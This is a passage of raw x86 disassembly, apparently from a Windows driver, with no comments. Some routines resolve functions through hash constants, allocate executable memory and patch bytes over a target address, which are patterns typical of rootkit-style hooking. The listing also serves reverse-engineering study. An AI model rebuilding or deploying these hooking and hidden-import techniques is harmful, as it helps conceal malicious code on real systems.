   1179b:	8b 74 24 10          	mov    0x10(%esp),%esi
   1179f:	8d 4c 24 20          	lea    0x20(%esp),%ecx
   117a3:	51                   	push   %ecx
   117a4:	8b 4c 24 20          	mov    0x20(%esp),%ecx
   117a8:	68 80 00 00 00       	push   $0x80
   117ad:	8d 54 24 1c          	lea    0x1c(%esp),%edx
   117b1:	52                   	push   %edx
   117b2:	8d 44 24 24          	lea    0x24(%esp),%eax
   117b6:	50                   	push   %eax
   117b7:	89 74 24 28          	mov    %esi,0x28(%esp)
   117bb:	c7 44 24 24 0c 00 00 	movl   $0xc,0x24(%esp)
   117c2:	00 
   117c3:	8b 11                	mov    (%ecx),%edx
   117c5:	6a ff                	push   $0xffffffff
   117c7:	ff d2                	call   *%edx
   117c9:	85 c0                	test   %eax,%eax
   117cb:	75 35                	jne    0x11802
   117cd:	8b 45 04             	mov    0x4(%ebp),%eax
   117d0:	05 90 00 00 00       	add    $0x90,%eax
   117d5:	e8 06 07 00 00       	call   0x11ee0
   117da:	85 c0                	test   %eax,%eax
   117dc:	75 24                	jne    0x11802
   117de:	8b 44 24 48          	mov    0x48(%esp),%eax
   117e2:	8b 55 04             	mov    0x4(%ebp),%edx
   117e5:	89 45 00             	mov    %eax,0x0(%ebp)
   117e8:	8b 0d 94 34 01 00    	mov    0x13494,%ecx
   117ee:	8b 44 24 20          	mov    0x20(%esp),%eax
   117f2:	03 cb                	add    %ebx,%ecx
   117f4:	89 4d 08             	mov    %ecx,0x8(%ebp)
   117f7:	89 75 0c             	mov    %esi,0xc(%ebp)
   117fa:	89 82 88 00 00 00    	mov    %eax,0x88(%edx)
   11800:	33 c0                	xor    %eax,%eax
   11802:	5f                   	pop    %edi
   11803:	5e                   	pop    %esi
   11804:	5d                   	pop    %ebp
   11805:	5b                   	pop    %ebx
   11806:	83 c4 34             	add    $0x34,%esp
   11809:	c2 08 00             	ret    $0x8
   1180c:	cc                   	int3
   1180d:	cc                   	int3
   1180e:	cc                   	int3
   1180f:	cc                   	int3
   11810:	83 ec 08             	sub    $0x8,%esp
   11813:	53                   	push   %ebx
   11814:	8b 5f 04             	mov    0x4(%edi),%ebx
   11817:	55                   	push   %ebp
   11818:	8b 6c 24 18          	mov    0x18(%esp),%ebp
   1181c:	83 c3 28             	add    $0x28,%ebx
   1181f:	56                   	push   %esi
   11820:	8d 43 11             	lea    0x11(%ebx),%eax
   11823:	8d 74 24 10          	lea    0x10(%esp),%esi
   11827:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
   1182e:	00 
   1182f:	89 44 24 1c          	mov    %eax,0x1c(%esp)
   11833:	e8 e8 f3 ff ff       	call   0x10c20
   11838:	8b 44 24 10          	mov    0x10(%esp),%eax
   1183c:	6a 40                	push   $0x40
   1183e:	68 00 10 00 00       	push   $0x1000
   11843:	8d 4c 24 24          	lea    0x24(%esp),%ecx
   11847:	51                   	push   %ecx
   11848:	8b 48 14             	mov    0x14(%eax),%ecx
   1184b:	6a 00                	push   $0x0
   1184d:	8d 54 24 1c          	lea    0x1c(%esp),%edx
   11851:	52                   	push   %edx
   11852:	6a ff                	push   $0xffffffff
   11854:	ff d1                	call   *%ecx
   11856:	85 c0                	test   %eax,%eax
   11858:	75 4e                	jne    0x118a8
   1185a:	39 5c 24 1c          	cmp    %ebx,0x1c(%esp)
   1185e:	72 48                	jb     0x118a8
   11860:	8b 74 24 0c          	mov    0xc(%esp),%esi
   11864:	85 f6                	test   %esi,%esi
   11866:	74 40                	je     0x118a8
   11868:	8b 57 04             	mov    0x4(%edi),%edx
   1186b:	8b 07                	mov    (%edi),%eax
   1186d:	52                   	push   %edx
   1186e:	50                   	push   %eax
   1186f:	8d 5e 28             	lea    0x28(%esi),%ebx
   11872:	53                   	push   %ebx
   11873:	e8 ec 18 00 00       	call   0x13164
   11878:	8b 44 24 24          	mov    0x24(%esp),%eax
   1187c:	89 5e 08             	mov    %ebx,0x8(%esi)
   1187f:	8b 4f 04             	mov    0x4(%edi),%ecx
   11882:	89 4e 10             	mov    %ecx,0x10(%esi)
   11885:	66 8b 50 04          	mov    0x4(%eax),%dx
   11889:	66 89 56 18          	mov    %dx,0x18(%esi)
   1188d:	8a 40 06             	mov    0x6(%eax),%al
   11890:	d0 e8                	shr    $1,%al
   11892:	83 c4 0c             	add    $0xc,%esp
   11895:	24 01                	and    $0x1,%al
   11897:	88 46 20             	mov    %al,0x20(%esi)
   1189a:	8b 4d 04             	mov    0x4(%ebp),%ecx
   1189d:	8b 51 70             	mov    0x70(%ecx),%edx
   118a0:	89 16                	mov    %edx,(%esi)
   118a2:	8b 45 04             	mov    0x4(%ebp),%eax
   118a5:	89 70 70             	mov    %esi,0x70(%eax)
   118a8:	5e                   	pop    %esi
   118a9:	5d                   	pop    %ebp
   118aa:	5b                   	pop    %ebx
   118ab:	83 c4 08             	add    $0x8,%esp
   118ae:	c2 08 00             	ret    $0x8
   118b1:	cc                   	int3
   118b2:	cc                   	int3
   118b3:	cc                   	int3
   118b4:	cc                   	int3
   118b5:	cc                   	int3
   118b6:	cc                   	int3
   118b7:	cc                   	int3
   118b8:	cc                   	int3
   118b9:	cc                   	int3
   118ba:	cc                   	int3
   118bb:	cc                   	int3
   118bc:	cc                   	int3
   118bd:	cc                   	int3
   118be:	cc                   	int3
   118bf:	cc                   	int3
   118c0:	83 ec 28             	sub    $0x28,%esp
   118c3:	53                   	push   %ebx
   118c4:	55                   	push   %ebp
   118c5:	8b 6c 24 38          	mov    0x38(%esp),%ebp
   118c9:	56                   	push   %esi
   118ca:	57                   	push   %edi
   118cb:	8b f8                	mov    %eax,%edi
   118cd:	8d 44 24 14          	lea    0x14(%esp),%eax
   118d1:	50                   	push   %eax
   118d2:	8b 44 24 48          	mov    0x48(%esp),%eax
   118d6:	8b cd                	mov    %ebp,%ecx
   118d8:	8d 74 24 20          	lea    0x20(%esp),%esi
   118dc:	c6 44 24 18 01       	movb   $0x1,0x18(%esp)
   118e1:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
   118e8:	00 
   118e9:	e8 f2 fc ff ff       	call   0x115e0
   118ee:	83 7c 24 20 00       	cmpl   $0x0,0x20(%esp)
   118f3:	74 64                	je     0x11959
   118f5:	8d 74 24 40          	lea    0x40(%esp),%esi
   118f9:	e8 a2 f2 ff ff       	call   0x10ba0
   118fe:	8b 5c 24 40          	mov    0x40(%esp),%ebx
   11902:	8b c7                	mov    %edi,%eax
   11904:	e8 f7 fa ff ff       	call   0x11400
   11909:	85 c0                	test   %eax,%eax
   1190b:	75 41                	jne    0x1194e
   1190d:	8b 44 24 3c          	mov    0x3c(%esp),%eax
   11911:	8d 4c 24 24          	lea    0x24(%esp),%ecx
   11915:	51                   	push   %ecx
   11916:	57                   	push   %edi
   11917:	e8 54 fd ff ff       	call   0x11670
   1191c:	85 c0                	test   %eax,%eax
   1191e:	75 39                	jne    0x11959
   11920:	8d 54 24 24          	lea    0x24(%esp),%edx
   11924:	52                   	push   %edx
   11925:	8b c3                	mov    %ebx,%eax
   11927:	e8 c4 fb ff ff       	call   0x114f0
   1192c:	85 c0                	test   %eax,%eax
   1192e:	74 13                	je     0x11943
   11930:	8d 44 24 14          	lea    0x14(%esp),%eax
   11934:	e8 37 f7 ff ff       	call   0x11070
   11939:	5f                   	pop    %edi
   1193a:	5e                   	pop    %esi
   1193b:	5d                   	pop    %ebp
   1193c:	5b                   	pop    %ebx
   1193d:	83 c4 28             	add    $0x28,%esp
   11940:	c2 0c 00             	ret    $0xc
   11943:	8b c7                	mov    %edi,%eax
   11945:	e8 b6 fa ff ff       	call   0x11400
   1194a:	85 c0                	test   %eax,%eax
   1194c:	74 e2                	je     0x11930
   1194e:	50                   	push   %eax
   1194f:	55                   	push   %ebp
   11950:	8d 7c 24 24          	lea    0x24(%esp),%edi
   11954:	e8 b7 fe ff ff       	call   0x11810
   11959:	80 7c 24 14 00       	cmpb   $0x0,0x14(%esp)
   1195e:	74 1e                	je     0x1197e
   11960:	8b 74 24 18          	mov    0x18(%esp),%esi
   11964:	85 f6                	test   %esi,%esi
   11966:	74 16                	je     0x1197e
   11968:	8b 06                	mov    (%esi),%eax
   1196a:	85 c0                	test   %eax,%eax
   1196c:	8b 3d f8 33 01 00    	mov    0x133f8,%edi
   11972:	74 05                	je     0x11979
   11974:	6a 00                	push   $0x0
   11976:	50                   	push   %eax
   11977:	ff d7                	call   *%edi
   11979:	6a 00                	push   $0x0
   1197b:	56                   	push   %esi
   1197c:	ff d7                	call   *%edi
   1197e:	5f                   	pop    %edi
   1197f:	5e                   	pop    %esi
   11980:	5d                   	pop    %ebp
   11981:	5b                   	pop    %ebx
   11982:	83 c4 28             	add    $0x28,%esp
   11985:	c2 0c 00             	ret    $0xc
   11988:	cc                   	int3
   11989:	cc                   	int3
   1198a:	cc                   	int3
   1198b:	cc                   	int3
   1198c:	cc                   	int3
   1198d:	cc                   	int3
   1198e:	cc                   	int3
   1198f:	cc                   	int3
   11990:	55                   	push   %ebp
   11991:	8b ec                	mov    %esp,%ebp
   11993:	6a ff                	push   $0xffffffff
   11995:	68 d8 50 01 00       	push   $0x150d8
   1199a:	68 6a 31 01 00       	push   $0x1316a
   1199f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
   119a5:	50                   	push   %eax
   119a6:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
   119ad:	83 ec 0c             	sub    $0xc,%esp
   119b0:	53                   	push   %ebx
   119b1:	56                   	push   %esi
   119b2:	57                   	push   %edi
   119b3:	89 65 e8             	mov    %esp,-0x18(%ebp)
   119b6:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
   119bd:	8b 45 0c             	mov    0xc(%ebp),%eax
   119c0:	50                   	push   %eax
   119c1:	51                   	push   %ecx
   119c2:	52                   	push   %edx
   119c3:	8b 45 08             	mov    0x8(%ebp),%eax
   119c6:	e8 f5 fe ff ff       	call   0x118c0
   119cb:	eb 09                	jmp    0x119d6
   119cd:	b8 01 00 00 00       	mov    $0x1,%eax
   119d2:	c3                   	ret
   119d3:	8b 65 e8             	mov    -0x18(%ebp),%esp
   119d6:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
   119dd:	8b 4d f0             	mov    -0x10(%ebp),%ecx
   119e0:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
   119e7:	5f                   	pop    %edi
   119e8:	5e                   	pop    %esi
   119e9:	5b                   	pop    %ebx
   119ea:	8b e5                	mov    %ebp,%esp
   119ec:	5d                   	pop    %ebp
   119ed:	c2 08 00             	ret    $0x8
   119f0:	83 ec 28             	sub    $0x28,%esp
   119f3:	53                   	push   %ebx
   119f4:	56                   	push   %esi
   119f5:	8b f0                	mov    %eax,%esi
   119f7:	8d 44 24 08          	lea    0x8(%esp),%eax
   119fb:	50                   	push   %eax
   119fc:	8b c6                	mov    %esi,%eax
   119fe:	8d 5c 24 10          	lea    0x10(%esp),%ebx
   11a02:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
   11a09:	00 
   11a0a:	e8 21 11 00 00       	call   0x12b30
   11a0f:	33 db                	xor    %ebx,%ebx
   11a11:	39 5c 24 08          	cmp    %ebx,0x8(%esp)
   11a15:	74 23                	je     0x11a3a
   11a17:	38 5c 24 0c          	cmp    %bl,0xc(%esp)
   11a1b:	74 51                	je     0x11a6e
   11a1d:	8d 74 24 3c          	lea    0x3c(%esp),%esi
   11a21:	88 5c 24 0c          	mov    %bl,0xc(%esp)
   11a25:	e8 f6 f1 ff ff       	call   0x10c20
   11a2a:	8b 54 24 3c          	mov    0x3c(%esp),%edx
   11a2e:	8b 42 1c             	mov    0x1c(%edx),%eax
   11a31:	8d 4c 24 18          	lea    0x18(%esp),%ecx
   11a35:	51                   	push   %ecx
   11a36:	ff d0                	call   *%eax
   11a38:	eb 34                	jmp    0x11a6e
   11a3a:	8b 4c 24 3c          	mov    0x3c(%esp),%ecx
   11a3e:	8b 54 24 34          	mov    0x34(%esp),%edx
   11a42:	51                   	push   %ecx
   11a43:	8b 4c 24 3c          	mov    0x3c(%esp),%ecx
   11a47:	56                   	push   %esi
   11a48:	e8 43 ff ff ff       	call   0x11990
   11a4d:	38 5c 24 0c          	cmp    %bl,0xc(%esp)
   11a51:	74 1b                	je     0x11a6e
   11a53:	8d 74 24 3c          	lea    0x3c(%esp),%esi
   11a57:	88 5c 24 0c          	mov    %bl,0xc(%esp)
   11a5b:	e8 c0 f1 ff ff       	call   0x10c20
   11a60:	8b 44 24 3c          	mov    0x3c(%esp),%eax
   11a64:	8b 48 1c             	mov    0x1c(%eax),%ecx
   11a67:	8d 54 24 18          	lea    0x18(%esp),%edx
   11a6b:	52                   	push   %edx
   11a6c:	ff d1                	call   *%ecx
   11a6e:	38 5c 24 10          	cmp    %bl,0x10(%esp)
   11a72:	74 0e                	je     0x11a82
   11a74:	8b 4c 24 14          	mov    0x14(%esp),%ecx
   11a78:	88 5c 24 10          	mov    %bl,0x10(%esp)
   11a7c:	ff 15 34 34 01 00    	call   *0x13434
   11a82:	5e                   	pop    %esi
   11a83:	5b                   	pop    %ebx
   11a84:	83 c4 28             	add    $0x28,%esp
   11a87:	c2 0c 00             	ret    $0xc
   11a8a:	cc                   	int3
   11a8b:	cc                   	int3
   11a8c:	cc                   	int3
   11a8d:	cc                   	int3
   11a8e:	cc                   	int3
   11a8f:	cc                   	int3
   11a90:	51                   	push   %ecx
   11a91:	53                   	push   %ebx
   11a92:	56                   	push   %esi
   11a93:	8d 74 24 08          	lea    0x8(%esp),%esi
   11a97:	e8 04 f1 ff ff       	call   0x10ba0
   11a9c:	8b 44 24 10          	mov    0x10(%esp),%eax
   11aa0:	8b 5c 24 08          	mov    0x8(%esp),%ebx
   11aa4:	e8 57 f9 ff ff       	call   0x11400
   11aa9:	5e                   	pop    %esi
   11aaa:	5b                   	pop    %ebx
   11aab:	59                   	pop    %ecx
   11aac:	c2 04 00             	ret    $0x4
   11aaf:	cc                   	int3
   11ab0:	55                   	push   %ebp
   11ab1:	8b ec                	mov    %esp,%ebp
   11ab3:	6a ff                	push   $0xffffffff
   11ab5:	68 b8 50 01 00       	push   $0x150b8
   11aba:	68 6a 31 01 00       	push   $0x1316a
   11abf:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
   11ac5:	50                   	push   %eax
   11ac6:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
   11acd:	83 ec 08             	sub    $0x8,%esp
   11ad0:	53                   	push   %ebx
   11ad1:	56                   	push   %esi
   11ad2:	57                   	push   %edi
   11ad3:	89 65 e8             	mov    %esp,-0x18(%ebp)
   11ad6:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
   11add:	8b 45 08             	mov    0x8(%ebp),%eax
   11ae0:	50                   	push   %eax
   11ae1:	e8 aa ff ff ff       	call   0x11a90
   11ae6:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
   11aed:	8b 4d f0             	mov    -0x10(%ebp),%ecx
   11af0:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
   11af7:	5f                   	pop    %edi
   11af8:	5e                   	pop    %esi
   11af9:	5b                   	pop    %ebx
   11afa:	8b e5                	mov    %ebp,%esp
   11afc:	5d                   	pop    %ebp
   11afd:	c2 04 00             	ret    $0x4
   11b00:	b8 01 00 00 00       	mov    $0x1,%eax
   11b05:	c3                   	ret
   11b06:	8b 65 e8             	mov    -0x18(%ebp),%esp
   11b09:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
   11b10:	33 c0                	xor    %eax,%eax
   11b12:	8b 4d f0             	mov    -0x10(%ebp),%ecx
   11b15:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
   11b1c:	5f                   	pop    %edi
   11b1d:	5e                   	pop    %esi
   11b1e:	5b                   	pop    %ebx
   11b1f:	8b e5                	mov    %ebp,%esp
   11b21:	5d                   	pop    %ebp
   11b22:	c2 04 00             	ret    $0x4
   11b25:	cc                   	int3
   11b26:	cc                   	int3
   11b27:	cc                   	int3
   11b28:	cc                   	int3
   11b29:	cc                   	int3
   11b2a:	cc                   	int3
   11b2b:	cc                   	int3
   11b2c:	cc                   	int3
   11b2d:	cc                   	int3
   11b2e:	cc                   	int3
   11b2f:	cc                   	int3
   11b30:	83 ec 38             	sub    $0x38,%esp
   11b33:	8b 08                	mov    (%eax),%ecx
   11b35:	8b 50 08             	mov    0x8(%eax),%edx
   11b38:	55                   	push   %ebp
   11b39:	8b 68 0c             	mov    0xc(%eax),%ebp
   11b3c:	57                   	push   %edi
   11b3d:	8b 78 04             	mov    0x4(%eax),%edi
   11b40:	8b 40 10             	mov    0x10(%eax),%eax
   11b43:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
   11b47:	8b 4c 24 48          	mov    0x48(%esp),%ecx
   11b4b:	89 54 24 14          	mov    %edx,0x14(%esp)
   11b4f:	8b 51 04             	mov    0x4(%ecx),%edx
   11b52:	6a 01                	push   $0x1
   11b54:	89 44 24 20          	mov    %eax,0x20(%esp)
   11b58:	52                   	push   %edx
   11b59:	8d 44 24 28          	lea    0x28(%esp),%eax
   11b5d:	50                   	push   %eax
   11b5e:	e8 d3 13 00 00       	call   0x12f36
   11b63:	83 c4 0c             	add    $0xc,%esp
   11b66:	85 c0                	test   %eax,%eax
   11b68:	0f 85 4f 01 00 00    	jne    0x11cbd
   11b6e:	53                   	push   %ebx
   11b6f:	56                   	push   %esi
   11b70:	8d 74 24 10          	lea    0x10(%esp),%esi
   11b74:	e8 27 f0 ff ff       	call   0x10ba0
   11b79:	8b 44 24 4c          	mov    0x4c(%esp),%eax
   11b7d:	8b 5c 24 10          	mov    0x10(%esp),%ebx
   11b81:	e8 da f8 ff ff       	call   0x11460
   11b86:	8b 4c 24 50          	mov    0x50(%esp),%ecx
   11b8a:	8b 51 04             	mov    0x4(%ecx),%edx
   11b8d:	8d 44 24 28          	lea    0x28(%esp),%eax
   11b91:	68 e9 b3 46 c8       	push   $0xc846b3e9
   11b96:	50                   	push   %eax
   11b97:	89 17                	mov    %edx,(%edi)
   11b99:	e8 22 15 00 00       	call   0x130c0
   11b9e:	8d 4c 24 30          	lea    0x30(%esp),%ecx
   11ba2:	68 cd 3f 76 90       	push   $0x90763fcd
   11ba7:	51                   	push   %ecx
   11ba8:	89 47 08             	mov    %eax,0x8(%edi)
   11bab:	e8 10 15 00 00       	call   0x130c0
   11bb0:	8d 54 24 38          	lea    0x38(%esp),%edx
   11bb4:	68 29 8c d7 9b       	push   $0x9bd78c29
   11bb9:	52                   	push   %edx
   11bba:	89 47 10             	mov    %eax,0x10(%edi)
   11bbd:	e8 fe 14 00 00       	call   0x130c0
   11bc2:	89 47 18             	mov    %eax,0x18(%edi)
   11bc5:	8d 44 24 40          	lea    0x40(%esp),%eax
   11bc9:	68 c9 78 80 22       	push   $0x228078c9
   11bce:	50                   	push   %eax
   11bcf:	e8 ec 14 00 00       	call   0x130c0
   11bd4:	8d 4c 24 48          	lea    0x48(%esp),%ecx
   11bd8:	68 3d ac b5 5b       	push   $0x5bb5ac3d
   11bdd:	51                   	push   %ecx
   11bde:	89 47 20             	mov    %eax,0x20(%edi)
   11be1:	e8 da 14 00 00       	call   0x130c0
   11be6:	8d 54 24 50          	lea    0x50(%esp),%edx
   11bea:	68 55 8b b6 5b       	push   $0x5bb68b55
   11bef:	52                   	push   %edx
   11bf0:	89 47 28             	mov    %eax,0x28(%edi)
   11bf3:	e8 c8 14 00 00       	call   0x130c0
   11bf8:	89 47 30             	mov    %eax,0x30(%edi)
   11bfb:	8d 44 24 58          	lea    0x58(%esp),%eax
   11bff:	68 5d 89 88 c6       	push   $0xc688895d
   11c04:	50                   	push   %eax
   11c05:	e8 b6 14 00 00       	call   0x130c0
   11c0a:	8d 4c 24 60          	lea    0x60(%esp),%ecx
   11c0e:	68 89 5b 72 e7       	push   $0xe7725b89
   11c13:	51                   	push   %ecx
   11c14:	89 47 38             	mov    %eax,0x38(%edi)
   11c17:	e8 a4 14 00 00       	call   0x130c0
   11c1c:	83 c4 40             	add    $0x40,%esp
   11c1f:	8d 54 24 28          	lea    0x28(%esp),%edx
   11c23:	68 b5 f9 47 07       	push   $0x747f9b5
   11c28:	52                   	push   %edx
   11c29:	89 47 40             	mov    %eax,0x40(%edi)
   11c2c:	e8 8f 14 00 00       	call   0x130c0
   11c31:	89 47 48             	mov    %eax,0x48(%edi)
   11c34:	8d 44 24 30          	lea    0x30(%esp),%eax
   11c38:	68 f8 4d 08 0c       	push   $0xc084df8
   11c3d:	50                   	push   %eax
   11c3e:	e8 7d 14 00 00       	call   0x130c0
   11c43:	83 c4 10             	add    $0x10,%esp
   11c46:	83 7f 08 00          	cmpl   $0x0,0x8(%edi)
   11c4a:	5e                   	pop    %esi
   11c4b:	89 47 50             	mov    %eax,0x50(%edi)
   11c4e:	5b                   	pop    %ebx
   11c4f:	74 6c                	je     0x11cbd
   11c51:	83 7f 10 00          	cmpl   $0x0,0x10(%edi)
   11c55:	74 66                	je     0x11cbd
   11c57:	83 7f 18 00          	cmpl   $0x0,0x18(%edi)
   11c5b:	74 60                	je     0x11cbd
   11c5d:	83 7f 20 00          	cmpl   $0x0,0x20(%edi)
   11c61:	74 5a                	je     0x11cbd
   11c63:	83 7f 28 00          	cmpl   $0x0,0x28(%edi)
   11c67:	74 54                	je     0x11cbd
   11c69:	83 7f 30 00          	cmpl   $0x0,0x30(%edi)
   11c6d:	74 4e                	je     0x11cbd
   11c6f:	83 7f 38 00          	cmpl   $0x0,0x38(%edi)
   11c73:	74 48                	je     0x11cbd
   11c75:	83 7f 40 00          	cmpl   $0x0,0x40(%edi)
   11c79:	74 42                	je     0x11cbd
   11c7b:	83 7f 48 00          	cmpl   $0x0,0x48(%edi)
   11c7f:	74 3c                	je     0x11cbd
   11c81:	85 c0                	test   %eax,%eax
   11c83:	74 38                	je     0x11cbd
   11c85:	8b 4d 00             	mov    0x0(%ebp),%ecx
   11c88:	89 4f 78             	mov    %ecx,0x78(%edi)
   11c8b:	8b 55 04             	mov    0x4(%ebp),%edx
   11c8e:	89 57 7c             	mov    %edx,0x7c(%edi)
   11c91:	8b 45 08             	mov    0x8(%ebp),%eax
   11c94:	89 87 80 00 00 00    	mov    %eax,0x80(%edi)
   11c9a:	8b 0d 88 34 01 00    	mov    0x13488,%ecx
   11ca0:	89 4d 00             	mov    %ecx,0x0(%ebp)
   11ca3:	66 8b 15 8c 34 01 00 	mov    0x1348c,%dx
   11caa:	8b 4c 24 14          	mov    0x14(%esp),%ecx
   11cae:	66 89 55 04          	mov    %dx,0x4(%ebp)
   11cb2:	a0 8e 34 01 00       	mov    0x1348e,%al
   11cb7:	88 45 06             	mov    %al,0x6(%ebp)
   11cba:	89 4d 01             	mov    %ecx,0x1(%ebp)
   11cbd:	5f                   	pop    %edi
   11cbe:	5d                   	pop    %ebp
   11cbf:	83 c4 38             	add    $0x38,%esp
   11cc2:	c2 08 00             	ret    $0x8
   11cc5:	cc                   	int3
   11cc6:	cc                   	int3
   11cc7:	cc                   	int3
   11cc8:	cc                   	int3
   11cc9:	cc                   	int3
   11cca:	cc                   	int3
   11ccb:	cc                   	int3
   11ccc:	cc                   	int3
   11ccd:	cc                   	int3
   11cce:	cc                   	int3
   11ccf:	cc                   	int3
   11cd0:	55                   	push   %ebp
   11cd1:	8b ec                	mov    %esp,%ebp
   11cd3:	6a ff                	push   $0xffffffff
   11cd5:	68 a8 50 01 00       	push   $0x150a8
   11cda:	68 6a 31 01 00       	push   $0x1316a
   11cdf:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
   11ce5:	50                   	push   %eax
   11ce6:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
   11ced:	83 ec 08             	sub    $0x8,%esp
   11cf0:	53                   	push   %ebx
   11cf1:	56                   	push   %esi
   11cf2:	57                   	push   %edi
   11cf3:	89 65 e8             	mov    %esp,-0x18(%ebp)
   11cf6:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
   11cfd:	8b 45 08             	mov    0x8(%ebp),%eax
   11d00:	50                   	push   %eax
   11d01:	51                   	push   %ecx
   11d02:	8b 45 0c             	mov    0xc(%ebp),%eax
   11d05:	e8 26 fe ff ff       	call   0x11b30
   11d0a:	eb 09                	jmp    0x11d15
   11d0c:	b8 01 00 00 00       	mov    $0x1,%eax
   11d11:	c3                   	ret
   11d12:	8b 65 e8             	mov    -0x18(%ebp),%esp
   11d15:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
   11d1c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
   11d1f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
   11d26:	5f                   	pop    %edi
   11d27:	5e                   	pop    %esi
   11d28:	5b                   	pop    %ebx
   11d29:	8b e5                	mov    %ebp,%esp
   11d2b:	5d                   	pop    %ebp
   11d2c:	c2 08 00             	ret    $0x8
   11d2f:	cc                   	int3
   11d30:	83 ec 28             	sub    $0x28,%esp
   11d33:	53                   	push   %ebx
   11d34:	56                   	push   %esi
   11d35:	57                   	push   %edi
   11d36:	e8 75 fd ff ff       	call   0x11ab0
   11d3b:	8b f0                	mov    %eax,%esi
   11d3d:	85 f6                	test   %esi,%esi
   11d3f:	0f 84 85 00 00 00    	je     0x11dca
   11d45:	8d 44 24 08          	lea    0x8(%esp),%eax
   11d49:	50                   	push   %eax
   11d4a:	8b c7                	mov    %edi,%eax
   11d4c:	8d 5c 24 10          	lea    0x10(%esp),%ebx
   11d50:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
   11d57:	00 
   11d58:	e8 d3 0d 00 00       	call   0x12b30
   11d5d:	33 db                	xor    %ebx,%ebx
   11d5f:	39 5c 24 08          	cmp    %ebx,0x8(%esp)
   11d63:	74 23                	je     0x11d88
   11d65:	38 5c 24 0c          	cmp    %bl,0xc(%esp)
   11d69:	74 4b                	je     0x11db6
   11d6b:	8d 74 24 34          	lea    0x34(%esp),%esi
   11d6f:	88 5c 24 0c          	mov    %bl,0xc(%esp)
   11d73:	e8 a8 ee ff ff       	call   0x10c20
   11d78:	8b 54 24 34          	mov    0x34(%esp),%edx
   11d7c:	8b 42 1c             	mov    0x1c(%edx),%eax
   11d7f:	8d 4c 24 18          	lea    0x18(%esp),%ecx
   11d83:	51                   	push   %ecx
   11d84:	ff d0                	call   *%eax
   11d86:	eb 2e                	jmp    0x11db6
   11d88:	8b 4c 24 34          	mov    0x34(%esp),%ecx
   11d8c:	56                   	push   %esi
   11d8d:	51                   	push   %ecx
   11d8e:	8b cf                	mov    %edi,%ecx
   11d90:	e8 3b ff ff ff       	call   0x11cd0
   11d95:	38 5c 24 0c          	cmp    %bl,0xc(%esp)
   11d99:	74 1b                	je     0x11db6
   11d9b:	8d 74 24 34          	lea    0x34(%esp),%esi
   11d9f:	88 5c 24 0c          	mov    %bl,0xc(%esp)
   11da3:	e8 78 ee ff ff       	call   0x10c20
   11da8:	8b 44 24 34          	mov    0x34(%esp),%eax
   11dac:	8b 48 1c             	mov    0x1c(%eax),%ecx
   11daf:	8d 54 24 18          	lea    0x18(%esp),%edx
   11db3:	52                   	push   %edx
   11db4:	ff d1                	call   *%ecx
   11db6:	38 5c 24 10          	cmp    %bl,0x10(%esp)
   11dba:	74 0e                	je     0x11dca
   11dbc:	8b 4c 24 14          	mov    0x14(%esp),%ecx
   11dc0:	88 5c 24 10          	mov    %bl,0x10(%esp)
   11dc4:	ff 15 34 34 01 00    	call   *0x13434
   11dca:	5e                   	pop    %esi
   11dcb:	5b                   	pop    %ebx
   11dcc:	83 c4 28             	add    $0x28,%esp
   11dcf:	c2 04 00             	ret    $0x4
   11dd2:	cc                   	int3
   11dd3:	cc                   	int3
   11dd4:	cc                   	int3
   11dd5:	cc                   	int3
   11dd6:	cc                   	int3
   11dd7:	cc                   	int3
   11dd8:	cc                   	int3
   11dd9:	cc                   	int3
   11dda:	cc                   	int3
   11ddb:	cc                   	int3
   11ddc:	cc                   	int3
   11ddd:	cc                   	int3
   11dde:	cc                   	int3
   11ddf:	cc                   	int3
   11de0:	83 ec 08             	sub    $0x8,%esp
   11de3:	56                   	push   %esi
   11de4:	57                   	push   %edi
   11de5:	8b f8                	mov    %eax,%edi
   11de7:	8d 70 02             	lea    0x2(%eax),%esi
   11dea:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
   11df0:	66 8b 08             	mov    (%eax),%cx
   11df3:	83 c0 02             	add    $0x2,%eax
   11df6:	66 85 c9             	test   %cx,%cx
   11df9:	75 f5                	jne    0x11df0
   11dfb:	2b c6                	sub    %esi,%eax
   11dfd:	d1 f8                	sar    $1,%eax
   11dff:	8b f0                	mov    %eax,%esi
   11e01:	66 8b 02             	mov    (%edx),%ax
   11e04:	66 d1 e8             	shr    $1,%ax
   11e07:	0f b7 c0             	movzwl %ax,%eax
   11e0a:	0f b7 c0             	movzwl %ax,%eax
   11e0d:	3b f0                	cmp    %eax,%esi
   11e0f:	76 08                	jbe    0x11e19
   11e11:	5f                   	pop    %edi
   11e12:	32 c0                	xor    %al,%al
   11e14:	5e                   	pop    %esi
   11e15:	83 c4 08             	add    $0x8,%esp
   11e18:	c3                   	ret
   11e19:	8b 4a 04             	mov    0x4(%edx),%ecx
   11e1c:	53                   	push   %ebx
   11e1d:	2b c6                	sub    %esi,%eax
   11e1f:	33 db                	xor    %ebx,%ebx
   11e21:	85 f6                	test   %esi,%esi
   11e23:	55                   	push   %ebp
   11e24:	8d 04 41             	lea    (%ecx,%eax,2),%eax
   11e27:	76 38                	jbe    0x11e61
   11e29:	2b c7                	sub    %edi,%eax
